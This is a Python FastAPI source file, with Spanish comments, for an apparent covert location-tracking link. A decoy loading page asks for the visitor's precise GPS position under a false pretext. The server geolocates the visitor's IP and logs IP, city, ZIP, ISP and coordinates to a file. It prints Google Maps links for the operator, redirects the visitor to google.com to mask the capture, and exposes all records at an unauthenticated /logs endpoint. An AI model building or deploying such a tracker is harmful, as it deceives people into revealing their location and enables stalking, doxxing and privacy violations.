from fastapi import FastAPI, Request
from fastapi.responses import RedirectResponse, PlainTextResponse, HTMLResponse
from datetime import datetime
import os
import httpx
import json

app = FastAPI()
LOG_FILE = "ip_logs.txt"

# Asegura que el archivo exista desde el arranque
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        f.write("Fecha y hora | IP | País | Región | Ciudad | ZIP | Coordenadas IP | Coordenadas GPS | Precisión | Zona Horaria | ISP | Organización | AS\n")

@app.get("/")
def root():
    return RedirectResponse("/track")

@app.get("/track")
async def track(request: Request):
    # Página HTML que solicita ubicación GPS
    html_content = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Cargando...</title>
        <meta charset="utf-8">
        <style>
            body {
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
            }
            .container {
                text-align: center;
                padding: 30px;
                background: rgba(255, 255, 255, 0.1);
                border-radius: 15px;
                backdrop-filter: blur(10px);
            }
            .spinner {
                border: 4px solid rgba(255, 255, 255, 0.3);
                border-radius: 50%;
                border-top: 4px solid white;
                width: 40px;
                height: 40px;
                animation: spin 1s linear infinite;
                margin: 20px auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            button {
                background: #ff6b6b;
                color: white;
                border: none;
                padding: 12px 24px;
                border-radius: 25px;
                cursor: pointer;
                font-size: 16px;
                margin-top: 15px;
                transition: background 0.3s;
            }
            button:hover {
                background: #ff5252;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>🔍 Verificando ubicación...</h2>
            <div class="spinner"></div>
            <p id="status">Obteniendo tu ubicación para una mejor experiencia</p>
            <button id="skipBtn" onclick="skipLocation()" style="display:none;">Continuar sin ubicación</button>
        </div>

        <script>
            let locationTimeout;
            let hasLocation = false;

            function updateStatus(message) {
                document.getElementById('status').textContent = message;
            }

            function showSkipButton() {
                document.getElementById('skipBtn').style.display = 'inline-block';
            }

            function skipLocation() {
                submitData(null, null, null);
            }

            function submitData(lat, lon, accuracy) {
                const data = {};
                if (lat !== null && lon !== null) {
                    data.gps_lat = lat;
                    data.gps_lon = lon;
                    data.gps_accuracy = accuracy || 'Desconocido';
                }

                fetch('/process-location', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                })
                .then(response => {
                    if (response.redirected) {
                        window.location.href = response.url;
                    } else {
                        return response.text().then(text => {
                            window.location.href = 'https://www.google.com';
                        });
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    window.location.href = 'https://www.google.com';
                });
            }

            // Timeout para mostrar botón de skip después de 10 segundos
            locationTimeout = setTimeout(() => {
                if (!hasLocation) {
                    updateStatus('La ubicación está tardando más de lo esperado...');
                    showSkipButton();
                }
            }, 10000);

            // Solicitar ubicación GPS
            if (navigator.geolocation) {
                updateStatus('Solicitando acceso a tu ubicación...');
                
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        hasLocation = true;
                        clearTimeout(locationTimeout);
                        updateStatus('¡Ubicación obtenida! Procesando...');
                        
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        
                        submitData(lat, lon, accuracy);
                    },
                    function(error) {
                        clearTimeout(locationTimeout);
                        let errorMsg = '';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMsg = 'Acceso a ubicación denegado por el usuario';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMsg = 'Información de ubicación no disponible';
                                break;
                            case error.TIMEOUT:
                                errorMsg = 'Tiempo de espera agotado';
                                break;
                            default:
                                errorMsg = 'Error desconocido al obtener ubicación';
                                break;
                        }
                        updateStatus(errorMsg);
                        showSkipButton();
                        
                        // Auto-skip después de 5 segundos en caso de error
                        setTimeout(() => {
                            submitData(null, null, null);
                        }, 5000);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 300000
                    }
                );
            } else {
                updateStatus('Tu navegador no soporta geolocalización');
                showSkipButton();
                setTimeout(() => {
                    submitData(null, null, null);
                }, 3000);
            }
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

@app.post("/process-location")
async def process_location(request: Request):
    
    # Obtener datos JSON del cuerpo de la petición
    try:
        body = await request.body()
        if body:
            data = json.loads(body)
            gps_lat = data.get('gps_lat')
            gps_lon = data.get('gps_lon')
            gps_accuracy = data.get('gps_accuracy')
        else:
            gps_lat = gps_lon = gps_accuracy = None
    except:
        gps_lat = gps_lon = gps_accuracy = None
    
    # Obtener IP del visitante
    x_forwarded_for = request.headers.get('X-Forwarded-For')
    ip = x_forwarded_for.split(',')[0] if x_forwarded_for else request.client.host
    
    # Consulta información geográfica con más precisión basada en IP
    ip_info = {
        "country": "Desconocido", 
        "countryCode": "Desconocido",
        "region": "Desconocido", 
        "regionName": "Desconocido",
        "city": "Desconocido", 
        "zip": "Desconocido",
        "lat": "Desconocido",
        "lon": "Desconocido",
        "timezone": "Desconocido",
        "isp": "Desconocido",
        "org": "Desconocido",
        "as": "Desconocido"
    }
    
    try:
        async with httpx.AsyncClient() as client:
            r = await client.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query")
            data = r.json()
            if data["status"] == "success":
                ip_info["country"] = data.get("country", "Desconocido")
                ip_info["countryCode"] = data.get("countryCode", "Desconocido")
                ip_info["region"] = data.get("region", "Desconocido")
                ip_info["regionName"] = data.get("regionName", "Desconocido")
                ip_info["city"] = data.get("city", "Desconocido")
                ip_info["zip"] = data.get("zip", "Desconocido")
                ip_info["lat"] = data.get("lat", "Desconocido")
                ip_info["lon"] = data.get("lon", "Desconocido")
                ip_info["timezone"] = data.get("timezone", "Desconocido")
                ip_info["isp"] = data.get("isp", "Desconocido")
                ip_info["org"] = data.get("org", "Desconocido")
                ip_info["as"] = data.get("as", "Desconocido")
    except Exception as e:
        print(f"Error al obtener información geográfica por IP: {e}")

    # Información GPS del navegador
    gps_coords = "No disponible"
    gps_precision = "N/A"
    if gps_lat and gps_lon:
        gps_coords = f"{gps_lat},{gps_lon}"
        gps_precision = f"{gps_accuracy}m" if gps_accuracy and gps_accuracy != "Desconocido" else "Desconocido"

    # Prepara la información para logging con ubicación GPS
    timestamp = datetime.now().isoformat()
    ip_coords = f"{ip_info['lat']},{ip_info['lon']}" if ip_info['lat'] != "Desconocido" else "No disponible"
    
    log_line = (f"{timestamp} | IP: {ip} | Country: {ip_info['country']} ({ip_info['countryCode']}) | "
                f"Region: {ip_info['regionName']} ({ip_info['region']}) | City: {ip_info['city']} | "
                f"ZIP: {ip_info['zip']} | IP_Coords: {ip_coords} | GPS_Coords: {gps_coords} | "
                f"GPS_Accuracy: {gps_precision} | Timezone: {ip_info['timezone']} | "
                f"ISP: {ip_info['isp']} | Org: {ip_info['org']} | AS: {ip_info['as']}\n")
    
    # Guarda la información en el archivo
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_line)
    
    # Muestra la información en consola con mayor detalle
    print("=" * 120)
    print("🎯 NUEVO VISITANTE DETECTADO CON UBICACIÓN PRECISA:")
    print(f"⏰ Timestamp: {timestamp}")
    print(f"🌐 IP: {ip}")
    print(f"🏳️ País: {ip_info['country']} ({ip_info['countryCode']})")
    print(f"🏘️ Región: {ip_info['regionName']} ({ip_info['region']})")
    print(f"🏙️ Ciudad: {ip_info['city']}")
    print(f"📮 Código Postal: {ip_info['zip']}")
    print(f"📍 Coordenadas IP: {ip_coords}")
    if gps_lat and gps_lon:
        print(f"📱 Coordenadas GPS: {gps_coords} (±{gps_precision})")
        print(f"🎯 Google Maps (GPS): https://www.google.com/maps?q={gps_lat},{gps_lon}")
        # Calcular distancia entre IP y GPS si ambos están disponibles
        if ip_info['lat'] != "Desconocido" and ip_info['lon'] != "Desconocido":
            try:
                # Cálculo simple de distancia (aproximado)
                lat_diff = abs(float(gps_lat) - float(ip_info['lat']))
                lon_diff = abs(float(gps_lon) - float(ip_info['lon']))
                approx_distance = ((lat_diff ** 2 + lon_diff ** 2) ** 0.5) * 111  # km aproximados
                print(f"📏 Diferencia IP vs GPS: ~{approx_distance:.2f} km")
            except:
                pass
    else:
        print(f"📱 Coordenadas GPS: No compartidas")
        if ip_coords != "No disponible":
            print(f"🗺️ Google Maps (IP): https://www.google.com/maps?q={ip_info['lat']},{ip_info['lon']}")
    
    print(f"🕐 Zona Horaria: {ip_info['timezone']}")
    print(f"🌐 ISP: {ip_info['isp']}")
    print(f"🏢 Organización: {ip_info['org']}")
    print(f"🔢 Sistema Autónomo: {ip_info['as']}")
    print("=" * 120)
    
    return RedirectResponse("https://www.google.com")

@app.get("/logs", response_class=PlainTextResponse)
def get_logs():
    try:
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            return f.read()
    except FileNotFoundError:
        return "El archivo de logs no existe aún."